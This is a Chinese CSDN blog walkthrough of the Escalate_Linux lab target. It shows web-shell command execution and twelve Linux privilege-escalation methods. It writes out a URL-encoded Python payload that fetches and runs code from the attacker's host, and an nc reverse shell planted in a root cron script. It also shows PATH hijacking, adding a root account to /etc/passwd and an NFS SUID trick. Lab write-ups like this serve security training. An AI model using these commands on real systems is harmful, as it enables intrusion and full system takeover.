@@ -1,0 +1,1164 @@
+<!doctype html>
+<html lang="zh-CN">
+ <head> 
+  <meta charset="utf-8"> 
+  <link rel="canonical" href="https://blog.csdn.net/serendipity1130/article/details/120009530"> 
+  <meta http-equiv="content-type" content="text/html; charset=utf-8"> 
+  <meta name="renderer" content="webkit"> 
+  <meta name="force-rendering" content="webkit"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <meta name="report" content="{&quot;pid&quot;: &quot;blog&quot;, &quot;spm&quot;:&quot;1001.2101&quot;}"> 
+  <meta name="referrer" content="always"> 
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <link rel="alternate" media="handheld" href="#"> 
+  <meta name="shenma-site-verification" content="5a59773ab8077d4a62bf469ab966a63b_1497598848"> 
+  <meta name="applicable-device" content="pc"> 
+  <link href="https://g.csdnimg.cn/static/logo/favicon32.ico" rel="shortcut icon" type="image/x-icon"> 
+  <title>【靶机渗透】Escalate_Linux靶机渗透练习+12种提权方式_escalate提权-CSDN博客</title>  
+  <meta name="keywords" content="Linux提权,Metasploit,SUID"> 
+  <meta name="csdn-baidu-search" content="{&quot;autorun&quot;:true,&quot;install&quot;:true,&quot;keyword&quot;:&quot;escalate提权&quot;}"> 
+  <meta name="description" content="文章浏览阅读5.2k次，点赞8次，收藏36次。注：这个靶机主要用来练习Linux提权，有超过12种的提权方法1.主机发现：arp-scan -l，发现靶机ip为192.168.225.149，并进行访问2.扫描端口，开启了80，22端口nmap -n -p- -A 192.168.225.149 -o escalate.nmap3.发现是默认的apache页面，那么爆破php后缀的路径，发现shell.php的页面，进行访问：dirb http://192.168.225.149 -X .php4.提示：_escalate提权"> 
+  <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/css/detail_enter-a805dca594.min.css">  
+  <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/release/blogv2/dist/pc/themesSkin/skin-number/skin-number-2c93789924.min.css">    
+  <meta name="toolbar" content="{&quot;type&quot;:&quot;0&quot;,&quot;fixModel&quot;:&quot;1&quot;}">    
+  <link rel="stylesheet" type="text/css" href="https://csdnimg.cn/public/sandalstrap/1.4/css/sandalstrap.min.css"> 
+  <style>
+        .MathJax, .MathJax_Message, .MathJax_Preview{
+            display: none
+        }
+    </style>      
+ 	<style>
+	main div.blog-content-box pre {
+		max-height: 100%;
+		overflow-y: hidden;
+	}
+	</style>
+ </head>  
+ <body class="nodata  " style=""> 
+  <div id="toolbarBox" style="min-height: 48px;"></div>    
+  <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/pc/css/blog_code-01256533b5.min.css"> 
+  <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/chart-3456820cac.css"> 
+  <link rel="stylesheet" href="https://g.csdnimg.cn/lib/swiper/6.0.4/css/swiper.css">   
+  <div class="main_father clearfix d-flex justify-content-center mainfather-concision" style="height:100%;"> 
+   <div class="container clearfix container-concision" id="mainBox">  
+    <main>  
+     <div class="blog-content-box"> 
+      <div class="article-header-box"> 
+       <div class="article-header"> 
+        <div class="article-title-box"> 
+         <h1 class="title-article" id="articleContentId">【靶机渗透】Escalate_Linux靶机渗透练习+12种提权方式</h1> 
+        </div> 
+        <div class="article-info-box"> 
+         <div class="up-time">
+          最新推荐文章于&nbsp;2024-04-09 16:18:16&nbsp;发布
+         </div> 
+         <div class="article-bar-top"> 
+          <img class="article-type-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/original.png" alt=""> 
+          <div class="bar-content"> 
+           <a href="https://mall.csdn.net/vip" data-report-query="spm=3001.10404" data-report-click="{&quot;spm&quot;:&quot;3001.10404&quot;}" data-report-view="{&quot;spm&quot;:&quot;3001.10404&quot;}" class="article-vip-box" target="_blank"><img class="article-vip-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/identityVipNew.png" alt=""></a> 
+           <a class="follow-nickName " href="https://blog.csdn.net/serendipity1130" target="_blank" rel="noopener" title="malloc_冲！">malloc_冲！</a> 
+           <img class="article-time-img article-heard-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCurrentTime2.png" alt=""> 
+           <span class="time blog-postTime" data-time="2021-08-31 09:06:48">最新推荐文章于&nbsp;2024-04-09 16:18:16&nbsp;发布</span> 
+           <div class="read-count-box"> 
+            <img class="article-read-img article-heard-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes2.png" alt=""> 
+            <span class="read-count">阅读量5.2k</span> 
+            <a id="blog_detail_zk_collection" class="un-collection" data-report-click="{&quot;mod&quot;:&quot;popu_823&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4232&quot;,&quot;ab&quot;:&quot;new&quot;}"> <img class="article-collect-img article-heard-img un-collect-status isdefault" style="display:inline-block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect2.png" alt=""> <img class="article-collect-img article-heard-img collect-status isactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive2.png" alt=""> <span class="name">收藏</span> <span class="get-collection"> 36 </span> </a> 
+            <div class="read-count-box is-like" data-type="top"> 
+             <img class="article-read-img article-heard-img" style="display:none" id="is-like-imgactive-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Active.png" alt=""> 
+             <img class="article-read-img article-heard-img" style="display:block" id="is-like-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newHeart2023Black.png" alt=""> 
+             <span class="read-count" id="blog-digg-num">点赞数 8 </span> 
+            </div> 
+           </div> 
+          </div> 
+         </div> 
+         <div class="blog-tags-box"> 
+          <div class="tags-box artic-tag-box"> 
+           <span class="label">分类专栏：</span> 
+           <a class="tag-link" href="https://blog.csdn.net/serendipity1130/category_11321741.html" target="_blank" rel="noopener">渗透测试</a> 
+           <span class="label">文章标签：</span> 
+           <a rel="noopener" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;php&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;php\&quot;}&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;php&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;php\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=php&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">php</a> 
+           <a rel="noopener" data-report-query="spm=1001.2101.3001.4223" data-report-click="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;linux&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;linux\&quot;}&quot;}" data-report-view="{&quot;mod&quot;:&quot;popu_626&quot;,&quot;spm&quot;:&quot;1001.2101.3001.4223&quot;,&quot;strategy&quot;:&quot;linux&quot;,&quot;ab&quot;:&quot;new&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;linux\&quot;}&quot;}" class="tag-link" href="https://so.csdn.net/so/search/s.do?q=linux&amp;t=all&amp;o=vip&amp;s=&amp;l=&amp;f=&amp;viparticle=&amp;from_tracking_code=tag_word&amp;from_code=app_blog_art" target="_blank">linux</a> 
+          </div> 
+         </div> 
+         <div class="slide-content-box"> 
+          <div class="article-copyright"> 
+           <div class="creativecommons">
+             版权声明：本文为博主原创文章，遵循
+            <a href="http://creativecommons.org/licenses/by-sa/4.0/" target="_blank" rel="noopener"> CC 4.0 BY-SA </a>版权协议，转载请附上原文出处链接和本声明。 
+           </div> 
+           <div class="article-source-link">
+             本文链接：
+            <a href="https://blog.csdn.net/serendipity1130/article/details/120009530" target="_blank">https://blog.csdn.net/serendipity1130/article/details/120009530</a> 
+           </div> 
+          </div> 
+         </div> 
+         <div class="operating"> 
+          <a class="href-article-edit slide-toggle">版权</a> 
+         </div> 
+        </div> 
+       </div> 
+      </div> 
+      <div id="blogHuaweiyunAdvert"></div> 
+      <article class="baidu_pl"> 
+       <div id="article_content" class="article_content clearfix"> 
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/kdoc_html_views-1a98987dfd.css"> 
+        <link rel="stylesheet" href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/ck_htmledit_views-704d5b9767.css"> 
+        <div id="content_views" class="htmledit_views atom-one-dark"> 
+         <p style="margin-left:0;text-align:left;"><span style="color:#538135;">注：这个靶机主要用来练习</span><span style="color:#538135;">Linux</span><span style="color:#538135;">提权，有超过</span><span style="color:#538135;">12</span><span style="color:#538135;">种的提权方法</span></p> 
+         <p style="margin-left:0;text-align:left;">1.主机发现：<span style="color:#538135;">arp-scan -l</span>，发现靶机ip为192.168.225.149，并进行访问</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="404" src="https://i-blog.csdnimg.cn/blog_migrate/7dfd419eef0867aa42f5b9e2bac5656f.png" width="1188"></p> 
+         <p style="margin-left:0;text-align:left;">2.扫描端口，开启了80，22端口</p> 
+         <div> 
+          <pre><code>nmap -n -p- -A 192.168.225.149 -o escalate.nmap</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="133" src="https://i-blog.csdnimg.cn/blog_migrate/95c1ffdb4c71502786cac9d7278389e7.png" width="659"></p> 
+         <p style="margin-left:0;text-align:left;">3.发现是默认的apache页面，那么爆破php后缀的路径，发现shell.php的页面，进行访问：</p> 
+         <div> 
+          <pre><code>dirb http://192.168.225.149 -X .php</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="80" src="https://i-blog.csdnimg.cn/blog_migrate/863402cd5884302ec0ba0218524a5716.png" width="452"></p> 
+         <p style="margin-left:0;text-align:left;">4.提示：使用cmd可以直接执行命令</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="145" src="https://i-blog.csdnimg.cn/blog_migrate/4c3857164579e3722ae5fb584af7e6bc.png" width="554"></p> 
+         <p style="margin-left:0;text-align:left;">确实可以：</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="143" src="https://i-blog.csdnimg.cn/blog_migrate/a4e751808c82a0feb1b3384ec31f69d7.png" width="1023"></p> 
+         <p style="margin-left:0;text-align:left;">5.使用msf进行攻击：</p> 
+         <div> 
+          <pre><code>use exploit/multi/script/web_delivery</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><span style="color:#c45911;">此模块支持在本地监听一个端口，别人一旦访问该端口就会将该端口内的文件读取至本地执行（把webshell放在该端口下刚刚好）</span></p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="88" src="https://i-blog.csdnimg.cn/blog_migrate/ddb90b8bc4885045ae75ebe0e178fa26.png" width="492"></p> 
+         <p style="margin-left:0;text-align:left;">6.设置服务端和本地地址都为攻击机ip，运行如下：<img alt="" height="201" src="https://i-blog.csdnimg.cn/blog_migrate/a11a1cf510642f58032009c8bc305cc3.png" width="1200"></p> 
+         <p style="margin-left:0;text-align:left;">工具提示把这段代码发给靶机执行，也就是放在cmd后面执行</p> 
+         <p style="margin-left:0;text-align:left;">7.因为服务端会进行url解码，所以先将payload进行url编码，目前来看只能使用burpsuite中的url编码：</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="278" src="https://i-blog.csdnimg.cn/blog_migrate/9baddf088baee5ed239473d7ad9d91ff.png" width="1200"></p> 
+         <p style="margin-left:0;text-align:left;">8.将编码进行命令执行：</p> 
+         <div> 
+          <pre><code>http://192.168.225.149/shell.php?cmd=%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%3b%69%6d%70%6f%72%74%20%73%73%6c%3b%75%3d%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%75%72%6c%6c%69%62%27%2b%7b%32%3a%27%27%2c%33%3a%27%2e%72%65%71%75%65%73%74%27%7d%5b%73%79%73%2e%76%65%72%73%69%6f%6e%5f%69%6e%66%6f%5b%30%5d%5d%2c%66%72%6f%6d%6c%69%73%74%3d%28%27%75%72%6c%6f%70%65%6e%27%2c%29%29%3b%72%3d%75%2e%75%72%6c%6f%70%65%6e%28%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%32%32%35%2e%31%33%33%3a%38%30%38%30%2f%4d%52%6a%53%77%32%54%64%38%48%47%27%2c%20%63%6f%6e%74%65%78%74%3d%73%73%6c%2e%5f%63%72%65%61%74%65%5f%75%6e%76%65%72%69%66%69%65%64%5f%63%6f%6e%74%65%78%74%28%29%29%3b%65%78%65%63%28%72%2e%72%65%61%64%28%29%29%3b%22</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="130" src="https://i-blog.csdnimg.cn/blog_migrate/ef89b2ec7e9f1c99272febcb60ac080e.png" width="1200"></p> 
+         <p style="margin-left:0;text-align:left;">9.kali机上随意选择一个sessions就完成了提权：</p> 
+         <div> 
+          <pre><code>sessions -i 3</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="249" src="https://i-blog.csdnimg.cn/blog_migrate/26accca90b5d1e05c3d8e89b264ea163.png" width="959"></p> 
+         <p style="margin-left:0;text-align:left;">8.开始进行shell环境</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="116" src="https://i-blog.csdnimg.cn/blog_migrate/75956e4c7bcf99441d840af6e3b92b46.png" width="489"></p> 
+         <p style="margin-left:0;text-align:left;">9.使用LinEnum工具枚举当前环境，该工具能把漏洞都体现出来：</p> 
+         <div> 
+          <pre><code>wget http://192.168.225.133/LinEnum.sh</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="205" src="https://i-blog.csdnimg.cn/blog_migrate/d5a19c31c39e50a4753cb127190258f3.png" width="633">注：要进入tmp目录下继续wget，主要是因为tmp目录权限大。并且要先在kali上开启http.server的服务。</p> 
+         <div> 
+          <p style="margin-left:0;text-align:left;"><span style="background-color:#FFFFFF;"><span style="background-color:#FFFFFF;"><span style="color:#538135;">LinEnum</span><span style="color:#538135;">讲解文章：</span><span style="color:#538135;">https://www.freesion.com/article/5522129624/</span></span></span></p> 
+         </div> 
+         <p style="margin-left:0;text-align:justify;">10.先修改一下执行权限，执行枚举脚本：</p> 
+         <div> 
+          <pre><code>chmod 777 LinEnum.sh
+./LinEnum.sh |more</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="143" src="https://i-blog.csdnimg.cn/blog_migrate/217eb14d55bfa8bc97153f4d79b97e9b.png" width="571"></p> 
+         <p style="margin-left:0;text-align:left;">执行结果如下：</p> 
+         <p style="margin-left:0;text-align:left;">1）确存在8个用户，那么有可能每个用户都有提权的可能性</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="393" src="https://i-blog.csdnimg.cn/blog_migrate/8b64baa461260f47dc0cc7eb9a2a9c7a.png" width="603">2）在crontab中，每5分钟使用root特权运行autoscript.sh文件<img alt="" height="408" src="https://i-blog.csdnimg.cn/blog_migrate/f5c28d1ac1cc37d12bca4a39fd4ce9fa.png" width="987"></p> 
+         <p style="margin-left:0;text-align:left;">3）看到/etc/passwd对用户也是可写的</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="101" src="https://i-blog.csdnimg.cn/blog_migrate/d7ef2578c45bacd9897039da0e76756b.png" width="486"></p> 
+         <p style="margin-left:0;text-align:left;">4）可以使用root特权运行shell和脚本文件，在其上启用了SUID位</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="298" src="https://i-blog.csdnimg.cn/blog_migrate/ea24e2ca9bea7f3a5a3b92167e479c80.png" width="685"></p> 
+         <h2 style="margin-left:0;text-align:justify;">1.suid提权：</h2> 
+         <p style="margin-left:0;text-align:left;">1)python实现交互式shell：</p> 
+         <div> 
+          <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="196" src="https://i-blog.csdnimg.cn/blog_migrate/7218545137af66ea8dabf1828749dab5.png" width="554"></p> 
+         <p style="margin-left:0;text-align:left;">上述反馈说明：当前通过metasploit反弹的shell是在user6用户上，那么我们看看此用户是否能够提权</p> 
+         <p style="margin-left:0;text-align:left;">2）首先查找下能否执行SUID特权的命令</p> 
+         <div> 
+          <pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code ></pre> 
+         </div> 
+         <p style="margin-left:0;text-align:left;">看到用户user3下面有个shell命令文件，能够使用SUID</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="51" src="https://i-blog.csdnimg.cn/blog_migrate/5bb4004e0c133028bbbc61097d318617.png" width="293"></p> 
+         <p style="margin-left:0;text-align:left;">猜测此shell命令的二进制文件里面含有C语言setuid提权代码</p> 
+         <p style="margin-left:0;text-align:left;">3）进入user3目录执行<span style="color:#538135;">./shell</span>：</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="261" src="https://i-blog.csdnimg.cn/blog_migrate/f61b49b48594e4c5b4d26d05e2c6bdef.png" width="534"></p> 
+         <p style="margin-left:0;text-align:left;"></p> 
+         <h2 style="margin-left:0;text-align:justify;">2.全局环境变量提权：</h2> 
+         <p style="margin-left:0;text-align:left;">1）使用user5的script脚本也可以进行提权，下面来探究一下如何进行提权操作</p> 
+         <p style="margin-left:0;text-align:left;">2）进入user5目录，执行发现和ls命令一样的结果，这是因为这个脚本是使用root权限执行ls命令，所以这里可以通过全局环境变量提权</p> 
+         <p style="margin-left:0;text-align:left;"><img alt="" height="72" src="https://i-blog.csdnimg.cn/blog_migrate/dfa489c955a7cf7d3e60b8741cec01d1.png" width="490"></p> 
+         <p style="margin-left:0;text-align:left;"></p> 
+         <p style="margin-left:0;text-align:left;">3）全局变量提权的参考文章及命令：<span style="color:#c45911;">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</span></p> 
+         <div> 
+          <pre><code>cd /tmp
+echo "/bin/bash" &gt; ls
+chmod +x ls
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/user5/
+./script</code ></pre> 
+          <p><img alt="" height="298" src="https://i-blog.csdnimg.cn/blog_migrate/20faa6816c967b2d18e41dd46599f24e.png" width="554"></p> 
+          <h2 style="margin-left:0;text-align:justify;">3.计划任务crontab提权：</h2> 
+          <p style="margin-left:0;text-align:left;">1.借鉴方法2，使用相同的脚本文件，借助Path变量方法更改user4用户的密码为123</p> 
+          <div> 
+           <pre><code>cd /tmp
+echo 'echo "user4:123" | chpasswd' &gt;ls
+chmod +x ls
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/user5/
+./script
+su user4</code ></pre> 
+           <p><img alt="" height="286" src="https://i-blog.csdnimg.cn/blog_migrate/c6f625595bfe9551f68fb56d29b6cce0.png" width="554"></p> 
+          </div> 
+          <p style="margin-left:0;text-align:left;"></p> 
+          <p style="margin-left:0;text-align:left;">2.使用msfvenom写一段反弹shell：</p> 
+          <div> 
+           <pre><code>msfvenom -p cmd/unix/reverse_netcat lhost=192.168.225.133 lport=8888 R</code ></pre> 
+           <p><img alt="" height="88" src="https://i-blog.csdnimg.cn/blog_migrate/fc719e44667722b8ba1ae4c61da02ef9.png" width="554"></p> 
+           <p style="margin-left:0;text-align:left;">3.在user4桌面文件夹中看到文件autoscript.sh，将反弹shell写入到autoscript脚本中：</p> 
+           <div> 
+            <pre><code>echo 'mkfifo /tmp/kndq; nc 192.168.225.133 8888 0&lt;/tmp/kndq | /bin/sh &gt;/tmp/kndq 2&gt;&amp;1; rm /tmp/kndq' &gt; autoscript.sh</code ></pre> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">4.在kali终端中开启监听，等待不到5分钟，等待autoscript.sh脚本自动加载，即可反弹回shell，查看权限为root：</p> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="118" src="https://i-blog.csdnimg.cn/blog_migrate/595bfe6fa3b330178ba6bc940c242b22.png" width="564"></p> 
+           <h2 style="margin-left:0;text-align:justify;">4.vi写入提权：</h2> 
+           <p style="margin-left:0;text-align:left;">1.借鉴方法3，将所有用户的密码更改为12345，并在用户之间切换来检查更多漏洞，发现user8对vi编辑器具有sudo权限</p> 
+           <div> 
+            <pre><code>cd /tmp
+echo 'echo "user8:123" | chpasswd' &gt;ls
+chmod +x ls
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/user5/
+./script
+su user8</code ></pre> 
+            <p style="margin-left:0;text-align:left;"><img alt="" height="97" src="https://i-blog.csdnimg.cn/blog_migrate/a69b21d368ad7497be4507c29fa95278.png" width="554"></p> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">2.使用sudo打开vi编辑器，并插入sh命令：</p> 
+           <pre><code>sudo vi
+:!sh
+&lt;enter&gt;
+</code ></pre> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="101" src="https://i-blog.csdnimg.cn/blog_migrate/157ef6b0bfc63ddd06bbbcd38d0e839c.png" width="366"></p> 
+           <h2 style="margin-left:0;text-align:justify;">5.openssl提权：</h2> 
+           <p style="margin-left:0;text-align:left;">1.继续根据枚举的信息，确认user7是gid为0的组成员，使用和方法3相同的办法进入user7，切换至user7，发现user7属于gid为0的组</p> 
+           <div> 
+            <pre><code>cd /tmp
+echo 'echo "user7:123" | chpasswd' &gt;ls
+chmod +x ls
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/user5/
+./script
+su user7</code ></pre> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">2.从LinEnum扫描中知道/etc/passwd文件对于用户是可写的：user7可以编辑/etc/passwd文件。</p> 
+           <p style="margin-left:0;text-align:left;">所以，创建了一个具有root特权的名为ysy的新用户，并使用openssl为该用户生成了密码：</p> 
+           <pre><code>openssl passwd -1 -salt ysy 123</code ></pre> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="73" src="https://i-blog.csdnimg.cn/blog_migrate/0fbef9f7927c482a7da6498718328015.png" width="554"></p> 
+           <p style="margin-left:0;text-align:left;">3.将这个密码写入到我新建的ysy用户中：</p> 
+           <div> 
+            <pre><code>echo 'ysy:$1$ysy$FEKea8H9FLIyRztwO8UXd/:0:0:/root:/bin/bash' &gt;&gt; /etc/passwd</code ></pre> 
+           </div> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="119" src="https://i-blog.csdnimg.cn/blog_migrate/2a42af27501215b0e7b610292f1322f8.png" width="885">查看一下，写进了！</p> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="96" src="https://i-blog.csdnimg.cn/blog_migrate/2f8fe5bb23abd40979ee69b5a6527861.png" width="553"></p> 
+           <p style="margin-left:0;text-align:left;">4.使用ysy的账号密码登录即可获得超户权限&nbsp;</p> 
+           <h2 style="margin-left:0;text-align:justify;">6.NFS挂载提权：</h2> 
+           <p style="margin-left:0;text-align:left;">1.枚举脚本含有针对NFS的服务</p> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="96" src="https://i-blog.csdnimg.cn/blog_migrate/ca62f389473d35abadd0dd0902d46d39.png" width="554">&nbsp;</p> 
+           <p style="margin-left:0;text-align:left;"></p> 
+           <p style="margin-left:0;text-align:left;">2.通过枚举的信息可知NFS服务配置不当导致直接提权，具体原因如下：</p> 
+           <div> 
+            <pre><code>cat /etc/exports</code ></pre> 
+            <p style="margin-left:0;text-align:left;"><img alt="" height="173" src="https://i-blog.csdnimg.cn/blog_migrate/cf803e0aee522ceb98e110aaf2fbc756.png" width="554">&nbsp;</p> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">3.发现<span style="color:#538135;">/home/user5 *(rw,no_root_squash)</span>，意思是可以通过用户user5生成一个可提权的可执行文件放在目标靶机执行即可提权</p> 
+           <p style="margin-left:0;text-align:left;">4.挂载nfs到本地kali，生成一个提权文件(靶机被完坏了，临时换一个ip：192.168.225.151)</p> 
+           <div> 
+            <pre><code>showmount -e 192.168.225.151
+mount -t nfs 192.168.225.151:/home/user5 /tmp/</code ></pre> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">3.将user5通过NFS共享到本地，创建一个SUID执行：</p> 
+           <div> 
+            <pre><code>cp /bin/sh rootysy
+chown root:root rootysy
+chmod 4755 rootysy</code ></pre> 
+           </div> 
+           <p style="margin-left:0;text-align:left;">4.在shell中进入user5：</p> 
+           <pre><code>cd /home/user5
+./rootysy
+</code ></pre> 
+           <h2 style="margin-left:0;text-align:justify;">7.mysql提权：</h2> 
+           <p style="margin-left:0;text-align:left;">1.尝试使用默认密码登录mysql:</p> 
+           <div> 
+            <pre><code>mysql -u root -p</code ></pre> 
+            <p style="margin-left:0;text-align:left;"><img alt="" height="66" src="https://i-blog.csdnimg.cn/blog_migrate/7bfa8383eca50822b0f27fa772a00e87.png" width="404"></p> 
+           </div> 
+           <p style="margin-left:0;text-align:left;"></p> 
+           <p style="margin-left:0;text-align:left;">2.查看数据库，一般思路要从user表中获取密码：</p> 
+           <pre><code>show databases;
+use user；
+show tables;
+select * from user_info；
+</code ></pre> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="174" src="https://i-blog.csdnimg.cn/blog_migrate/eac1a962ab1e3d61fc3d46001cde3793.png" width="309"></p> 
+           <p style="margin-left:0;text-align:left;">3.获取mysql的密码为<span style="color:#538135;">mysql@12345</span>，所以切换至mysql用户</p> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="166" src="https://i-blog.csdnimg.cn/blog_migrate/7628fbaff27e2cae361a8a1c3d60850a.png" width="669"></p> 
+           <p style="margin-left:0;text-align:left;">4.经过查找，发现用户1-8的密码：</p> 
+           <pre><code>ls -la
+chmod 600 .user_informations
+cat .user_informations
+</code ></pre> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="262" src="https://i-blog.csdnimg.cn/blog_migrate/1b7e12e86616ad39d19aa12a4d9fc834.png" width="554"></p> 
+           <p style="margin-left:0;text-align:left;">5.继续信息收集，在secret.cnf中发现root账号的密码：</p> 
+           <div> 
+            <pre><code>cd /etc/mysql
+cat secret.cnf</code ></pre> 
+           </div> 
+           <p>&nbsp;<img alt="" height="131" src="https://i-blog.csdnimg.cn/blog_migrate/5743e66b2f5bccab27287e182af18eb0.png" width="554"></p> 
+           <h2 style="margin-left:0;text-align:justify;">8.运行超户身份提权：</h2> 
+           <p style="margin-left:0;text-align:left;">1.因为上面知道各个用户的密码，看看还有哪个用户没使用其进行提权，看了下user2没有，切换过去看看</p> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="201" src="https://i-blog.csdnimg.cn/blog_migrate/a33c26c0da76ccc84148fd3a1e3bbcbf.png" width="554"></p> 
+           <p style="margin-left:0;text-align:left;"></p> 
+           <p style="margin-left:0;text-align:left;">2.根据提示执行：</p> 
+           <div> 
+            <pre><code>sudo -u user1 bash&nbsp; //以超户身份运行bash
+sudo su</code ></pre> 
+           </div> 
+          </div> 
+          <p><img alt="" height="266" src="https://i-blog.csdnimg.cn/blog_migrate/332788bbdab0d1729d599449c17573de.png" width="554"></p> 
+          <h2 style="margin-left:0;text-align:justify;">9.uid提权：</h2> 
+          <p style="margin-left:0;text-align:left;">1.切换至user4，发现root的组里面有user4和user7，意思是user4和user7可以修改/etc/passwd文件,那么提权的方式跟方法五是一样的，直接添加uid为0的用户即可提权</p> 
+          <div> 
+           <pre><code>su user4
+
+cat /etc/group</code ></pre> 
+           <p><img alt="" height="130" src="https://i-blog.csdnimg.cn/blog_migrate/417c798e43c7224e38a0f7e57e5723b6.png" width="554"></p> 
+          </div> 
+          <p style="margin-left:0;text-align:left;">2.使用openssl生成自定义的密码</p> 
+          <h2 style="margin-left:0;text-align:justify;">10.shell提权：</h2> 
+          <p style="margin-left:0;text-align:left;">1.在/home/user3下，发现了script.sh文件</p> 
+          <p><img alt="" height="139" src="https://i-blog.csdnimg.cn/blog_migrate/d08938239582e842d786348b22ef5b06.png" width="554"></p> 
+          <p style="margin-left:0;text-align:left;">2.这里直接执行.script.sh是不能提权的，需要借用执行shell才能提权，因为通过strings命令查看shell的二进制文件发现里面是调用.script.sh所以套路跟方法一时候一样的，执行.script.sh脚本即可</p> 
+          <div> 
+           <pre><code>echo "/bin/sh" &gt;.script.sh
+./shell</code ></pre> 
+           <p style="margin-left:0;text-align:left;"><img alt="" height="122" src="https://i-blog.csdnimg.cn/blog_migrate/1a684563f761d8ffb2372c9bd9035702.png" width="554"></p> 
+          </div> 
+          <p style="margin-left:0;text-align:left;"></p> 
+          <h2 style="margin-left:0;text-align:justify;">11.john爆破提权：</h2> 
+          <p style="margin-left:0;text-align:left;">1.echo查看/etc/shadow文件，读取root的hash，并使用john中自带密码库进行爆破即可</p> 
+          <h2 style="margin-left:0;text-align:justify;">12.user提权：</h2> 
+          <p style="margin-left:0;text-align:left;">1.直接通过user1的密码查看sudo -l 的特权：</p> 
+          <p style="margin-left:0;text-align:left;"><img alt="" height="196" src="https://i-blog.csdnimg.cn/blog_migrate/4fbf265bd5a0d31aa68d8e489c23b36f.png" width="769"></p> 
+          <p style="margin-left:0;text-align:left;">2.执行sudo -i即可提权：</p> 
+         </div> 
+        </div> 
+       </div> 
+      </article>  
+     </div> 
+     <div class="directory-boxshadow-dialog" style="display:none;"> 
+      <div class="directory-boxshadow-dialog-box"> 
